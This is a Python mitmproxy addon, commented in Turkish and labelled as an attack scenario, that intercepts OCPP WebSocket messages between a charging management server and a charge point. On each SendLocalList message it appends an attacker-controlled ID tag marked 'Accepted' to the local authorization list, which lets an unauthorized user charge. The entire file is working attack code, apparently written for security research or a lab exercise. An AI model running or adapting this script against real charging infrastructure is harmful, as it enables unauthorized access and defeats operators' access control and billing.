# mitm_modify_ws.py (Senaryo 2: KESİN DÜZELTME - API Hatası)
from mitmproxy import ctx
import json

# Saldırganın listeye eklemek istediği ID (Word dosyasındaki)
ATTACKER_ID = "ATTACKER_TAG_999"


class WebSocketModifier:

    # 'flow' argümanı burada ZATEN MESAJIN KENDİSİDİR (WebSocketMessage objesi)
    # 'flow.message' diye bir özellik yoktur.
    def websocket_message(self, flow):

        # 'flow' (mesaj) sunucudan istemciye mi gidiyor? (CSMS -> CP)
        if not flow.from_client and flow.type == 1:  # 1 = TEXT
            try:
                # 'flow.content' (mesajın içeriği) kullanılır
                data = json.loads(flow.content)

                # Mesaj bir 'CALL' (2) ve metodu 'SendLocalList' (data[2]) ise
                if data[0] == 2 and data[2] == "SendLocalList":
                    original_payload = flow.content.decode('utf-8')
                    ctx.log.warn(f"[MITM] >>> YAKALANDI (SendLocalList): {original_payload}")

                    payload_dict = data[3]
                    auth_list = payload_dict.get("localAuthorizationList", [])

                    # Listeye sahte ID'yi ekle
                    attacker_entry = {
                        "idTag": ATTACKER_ID,
                        "idTagInfo": {"status": "Accepted"}
                    }
                    auth_list.append(attacker_entry)
                    ctx.log.warn(f"[MITM] +++ {ATTACKER_ID} listeye eklendi.")

                    payload_dict["localAuthorizationList"] = auth_list
                    data[3] = payload_dict

                    new_payload_str = json.dumps(data)

                    # Mesajın içeriğini (flow.text) değiştir
                    flow.text = new_payload_str

                    ctx.log.warn(f"[MITM] <<< DEĞİŞTİRİLDİ: {new_payload_str}")

            except json.JSONDecodeError:
                pass  # JSON olmayan WS mesajlarını (ping/pong vb.) görmezden gel
            except Exception as e:
                ctx.log.error(f"[MITM] Mesaj değiştirilirken hata: {e}")


addons = [WebSocketModifier()]